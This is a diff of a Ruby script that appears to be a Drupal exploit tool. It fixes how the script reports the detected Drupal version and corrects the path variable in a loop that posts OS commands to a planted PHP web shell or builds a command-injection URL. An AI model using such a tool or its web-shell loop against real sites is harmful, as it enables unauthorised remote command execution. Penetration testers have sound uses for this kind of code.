@@ -338,7 +338,7 @@ url.each do|uri|
 
       if not metatag.empty?
         $drupalverion = "#{metatag}.x" if $drupalverion.empty?
-        puts success("Metatag: v#{metatag} [Generator]")
+        puts success("Metatag: v#{$drupalverion} [Generator]")
         puts verbose(meta.to_s) if $verbose
       end
     end
@@ -358,11 +358,8 @@ url.each do|uri|
       # Try and get version from the URL (For Drupal v8.x)
       $drupalverion = uri.match(/core/)? "8.x" : "" if $drupalverion.empty?
 
-      puts success("URL    : v#{$drupalverion}") if not $drupalverion.empty?
-
-      # Fall back
-      puts warning("Falling back to v7.x") if $drupalverion.empty?
-      $drupalverion = "7.x" if $drupalverion.empty?
+      # If we got something, show it!
+      puts success("URL    : v#{$drupalverion}?") if not $drupalverion.empty?
     end
 
   else
@@ -655,7 +652,7 @@ loop do
   # If PHP web shell
   if not webshellpath.empty?
     # Send request
-    result = http_request("#{$target}#{webshell}", "post", "c=#{command}", $session_cookie).body
+    result = http_request("#{$target}#{webshellpath}", "post", "c=#{command}", $session_cookie).body
   # Direct OS commands
   else
     url, payload = gen_evil_url(command, $element, true)
